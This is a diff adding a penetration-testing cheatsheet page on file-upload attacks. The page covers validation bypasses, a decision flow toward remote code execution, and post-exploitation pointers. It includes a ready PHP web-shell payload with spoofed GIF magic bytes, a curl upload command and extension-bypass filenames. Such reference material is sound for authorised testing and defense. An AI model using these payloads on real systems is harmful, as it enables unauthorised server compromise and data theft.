@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>File Upload · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../index.html">Cheatsheets</a> › Web › File Upload</nav><h1>File Upload</h1><p class="cx-lede">Operator reference for file-upload attacks - arbitrary file upload, client-side bypass, extension blacklist/whitelist bypass, content-type spoofing, and limited-upload attack chains (XSS, XXE, DoS).</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1505.003, T1059</span><span class="cx-tag">D3FEND D3-EAL, D3-FA</span><span class="cx-tag">IMPACT RCE, ServerSideEval, FileWrite</span><span class="cx-tag">OWASP A05, A06, A02</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>The application accepts uploads from users. Validation is missing or weak. The operator uploads a file that gets stored in a web-served directory, requests the URL, the server executes the file. RCE in three or four requests.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Find a parameter that accepts file uploads
+POST /upload    multipart/form-data    filename=&quot;X.php&quot;  content=&quot;&lt;?php ...&quot;
+
+# 2. If validation is client-side only, bypass via direct request
+curl -F &quot;file=@shell.php&quot; https://target/upload
+
+# 3. If extension blacklist - use a less-common executable extension
+shell.phtml   shell.phar   shell.php5   shell.pHp
+
+# 4. If extension whitelist - chain extensions or inject characters
+shell.jpg.php       (double extension)
+shell.php.jpg       (reverse - Apache misconfig)
+shell.php%00.jpg    (null byte - PHP &lt;5.3.4)
+
+# 5. If content-type validated - magic bytes + Content-Type spoof
+GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;   with   Content-Type: image/gif
+
+# 6. Visit the uploaded file
+https://target/uploads/shell.phar?cmd=id
+→ uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<p>Success indicator: command output (or file contents, or browser-side XSS execution) in the response after triggering the uploaded file.</p>
+<h2 id="where-this-lives">Where this lives</h2>
+<p>Anywhere the application takes a file from the user and stores it server-side:</p>
+<ul>
+<li><strong>Profile / avatar upload</strong> - almost universal on apps with user accounts</li>
+<li><strong>Document attachment</strong> - tickets, comments, support forms</li>
+<li><strong>Bulk import</strong> - CSV/Excel/XML import features</li>
+<li><strong>Resume / CV upload</strong> - job-board apps</li>
+<li><strong>Logo / brand image</strong> - admin settings</li>
+<li><strong>Image upload in CMS / wiki editors</strong></li>
+<li><strong>Feedback or contact forms with file attachment</strong></li>
+<li><strong>Cloud storage features</strong> - Drive-clone apps</li>
+<li><strong>File-conversion services</strong> - PDF converters, image resizers</li>
+</ul>
+<p>If the application has a file-selector dialog anywhere, this section applies.</p>
+<h2 id="validation-taxonomy">Validation taxonomy</h2>
+<p>Applications typically combine several validation layers. Each has its own bypass class:</p>
+<table>
+<thead>
+<tr>
+<th>Validation type</th>
+<th>What it checks</th>
+<th>Bypass</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Client-side (JS)</td>
+<td>File extension via JavaScript, MIME-type dialog</td>
+<td>Request manipulation, JS disable</td>
+</tr>
+<tr>
+<td>Extension blacklist</td>
+<td>File extension against a deny-list</td>
+<td>Uncommon extensions, case manipulation</td>
+</tr>
+<tr>
+<td>Extension whitelist</td>
+<td>File extension against an allow-list</td>
+<td>Double extension, character injection</td>
+</tr>
+<tr>
+<td>Content-Type header</td>
+<td>The HTTP <code>Content-Type</code> header on the upload</td>
+<td>Spoof the header to a permitted value</td>
+</tr>
+<tr>
+<td>Magic bytes / MIME sniffing</td>
+<td>First bytes of file content</td>
+<td>Prepend valid magic bytes to malicious content</td>
+</tr>
+<tr>
+<td>File-size limit</td>
+<td>Bytes in the file</td>
+<td>Either compress the payload or accept reduced payloads</td>
+</tr>
+<tr>
+<td>Filename sanitization</td>
+<td>Path traversal, special chars in filename</td>
+<td>Encoding, alternate path separators</td>
+</tr>
+</tbody>
+</table>
+<p>A complete bypass on a hardened app may need to satisfy three or four of these simultaneously.</p>
+<h2 id="decision-flow">Decision flow</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1. What validations are in place?
+   ├─ No validation        → just upload your shell        → done
+   ├─ Client-side only     → see Client-side bypass
+   ├─ Extension blacklist  → see Extension blacklist
+   ├─ Extension whitelist  → see Extension whitelist
+   └─ Content validation   → see Content-Type bypass
+
+2. After upload - where did it go?
+   ├─ Known URL path       → visit it directly
+   ├─ Random/hashed name   → check the upload response, page source, or fuzz
+   └─ Hidden entirely      → see post-upload § directory disclosure
+
+3. Did execution work?
+   ├─ Yes, command output  → done
+   ├─ Source code shown    → wrong execution context - try .phar, .phtml, .phps
+   ├─ &quot;Forbidden&quot; / 403    → upload-dir has script execution disabled - try LFI chain
+   └─ &quot;Not found&quot; / 404    → upload path wrong - see post-upload § directory disclosure
+
+4. Arbitrary upload not possible - what attacks remain?
+   ├─ HTML upload?         → Stored XSS         → see Limited uploads
+   ├─ SVG upload?          → XSS or XXE          → see Limited uploads
+   ├─ XML/DOC upload?      → XXE                 → see Limited uploads
+   ├─ ZIP upload?          → Decompression DoS    → see Limited uploads
+   └─ Image upload only?   → Pixel-flood DoS, EXIF XSS → see Limited uploads</code></pre></figure>
+<h2 id="decision-flow-page-links">Decision-flow page links</h2>
+<ol>
+<li><strong>First upload attempt - find a working extension</strong> → <a href="shells/index.html">Shells</a></li>
+<li><strong>Client-side JS validation blocks the upload?</strong> → <a href="client-side-bypass/index.html">Client-side bypass</a></li>
+<li><strong>Extension blacklist in the response error?</strong> → <a href="extension-blacklist/index.html">Extension blacklist</a></li>
+<li><strong>Extension whitelist (only images allowed)?</strong> → <a href="extension-whitelist/index.html">Extension whitelist</a></li>
+<li><strong>Content-Type / MIME validation?</strong> → <a href="content-type-bypass/index.html">Content-Type bypass</a></li>
+<li><strong>Only specific non-executable types allowed?</strong> → <a href="limited-uploads/index.html">Limited uploads</a></li>
+<li><strong>Need to find the upload directory, or filename injection?</strong> → <a href="post-upload/index.html">Post-upload</a></li>
+<li><strong>Reporting it, or hardening against it?</strong> → <a href="defense/index.html">Defense</a></li>
+</ol>
+<h2 id="impact-ladder">Impact ladder</h2>
+<table>
+<thead>
+<tr>
+<th>Tier</th>
+<th>What you can do</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Confirm upload accepted</td>
+<td>Any payload that returns "success"</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Stored XSS via HTML/SVG/EXIF</td>
+<td>Limited-upload chain - see Limited uploads</td>
+</tr>
+<tr>
+<td>3</td>
+<td>File read / SSRF via SVG-XXE</td>
+<td>Limited-upload chain - XXE in SVG</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Overwrite arbitrary files</td>
+<td>Filename path traversal in upload</td>
+</tr>
+<tr>
+<td>5</td>
+<td>RCE via uploaded executable</td>
+<td>Standard upload-shell path</td>
+</tr>
+</tbody>
+</table>
+<p>Most engagements aim for Tier 5 directly when the validation gaps allow. Tiers 2-4 are the fallbacks when arbitrary executable upload is locked down - and they're still serious findings.</p>
+<h2 id="operating-notes">Operating notes</h2>
+<p><strong>Identify the framework first.</strong> PHP, .NET, Java, NodeJS - each needs a different shell. A PHP web shell on a Java app does nothing. Quick checks:</p>
+<ul>
+<li>Visit <code>/index.php</code>, <code>/index.aspx</code>, <code>/index.jsp</code> - whichever resolves identifies the framework</li>
+<li>Wappalyzer browser extension shows the stack in one click</li>
+<li>Server response headers (<code>Server</code>, <code>X-Powered-By</code>) often reveal it</li>
+<li>File extensions in the application's normal URLs</li>
+</ul>
+<p><strong>Test a Hello-World payload before a shell.</strong> Upload a file with <code>&lt;?php echo "OK"; ?&gt;</code> first. If you see <code>OK</code> in the response when you visit the upload, the framework is executing the file - proceed with a real shell. If you see the source code, the upload directory doesn't execute scripts and you need a different path (LFI chain, different filename).</p>
+<p><strong>The uploaded file's URL is the bottleneck.</strong> A successful upload that you can't find is useless. Check:
+- Direct response from the upload endpoint (sometimes returns the URL)
+- View source on any page that displays the upload (<code>&lt;img src="..."&gt;</code> reveals path)
+- Common upload directories: <code>/uploads/</code>, <code>/files/</code>, <code>/avatars/</code>, <code>/profile_images/</code>, <code>/media/</code>
+- Fuzz with directory wordlists if all else fails</p>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>A working file-upload-to-RCE reaches the server with full web-application user context. This means file write anywhere the web user can write, command execution at the application's privilege level, and potential pivoting from there. Demonstrate at the <code>id</code> / <code>whoami</code> level and stop until scope-confirmed for further work.</p>
+</div>
+<h2 id="cross-references">Cross-references</h2>
+<ul>
+<li><strong>LFI + uploads chain</strong> - when the upload itself is locked down but the application has LFI, you can combine: upload a file with PHP in it (any extension), then include it via the LFI. See <a href="../lfi/file-upload-chain/index.html">LFI file-upload chain</a>.</li>
+<li><strong>Command injection in filenames</strong> - when the application uses the uploaded filename in a shell command, injection in the name leads to command execution. See <a href="../command-injection/index.html">Command Injection</a> for the technique side; this section covers the upload-specific delivery.</li>
+</ul>
+<p>The <a href="shells/index.html">Shells</a> page is the right starting point if you've confirmed an upload works and need a payload. The bypass pages assume you've tried the simple case and hit a filter.</p>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong>Upload accepted as-is, file accessible at <code>/uploads/shell.php</code></strong> → drop a <a href="shells/index.html">web shell</a> and pivot to OS shell</li>
+<li><strong>Upload accepted but file not accessible (returns 404)</strong> → use <a href="post-upload/index.html">post-upload techniques</a> - find where files actually land, try directory traversal in the filename, or chain with <a href="../lfi/index.html">LFI</a> to include the uploaded file</li>
+<li><strong>JavaScript blocks the upload on the client</strong> → <a href="client-side-bypass/index.html">client-side bypass</a> - disable JS, use Burp Repeater, manipulate request directly</li>
+<li><strong>Extension blacklist (rejects <code>.php</code>, <code>.asp</code>, etc.)</strong> → <a href="extension-blacklist/index.html">extension-blacklist bypass</a> (<code>.phtml</code>, <code>.php5</code>, <code>.phar</code>, case variants, double extensions)</li>
+<li><strong>Extension whitelist (only allows <code>.jpg</code>/<code>.png</code>)</strong> → <a href="extension-whitelist/index.html">extension-whitelist bypass</a> - content-type-only checks, magic-byte spoofing, polyglot files</li>
+<li><strong>Content-Type validated, extension restricted</strong> → <a href="content-type-bypass/index.html">content-type bypass</a> - spoof <code>Content-Type: image/jpeg</code> while smuggling PHP</li>
+<li><strong>Only images allowed and properly validated</strong> → <a href="limited-uploads/index.html">limited uploads</a> - even constrained uploads can serve XSS (SVG with <code>&lt;script&gt;</code>), XXE (DOCX/XLSX/SVG with XML), or stored payloads</li>
+<li><strong>Got web shell but command execution disabled</strong> → check <code>disable_functions</code> in php.ini; try alternate execution sinks (<code>proc_open</code>, <code>popen</code>, <code>pcntl_exec</code>); look for SUID binaries on disk</li>
+<li><strong>Web shell as <code>www-data</code> / IIS app pool</strong> → on Windows pivot to <a href="../../windows/privesc/seimpersonate/index.html">SeImpersonate</a>; on Linux look for <a href="../lfi/index.html">credential files</a> and SUID binaries</li>
+</ul></article><nav class="cx-pager"><a class="cx-next" href="shells/index.html">Next: Shells</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../license.html">License</a></p></footer>
+<script src="../../../codex.js"></script></body></html>
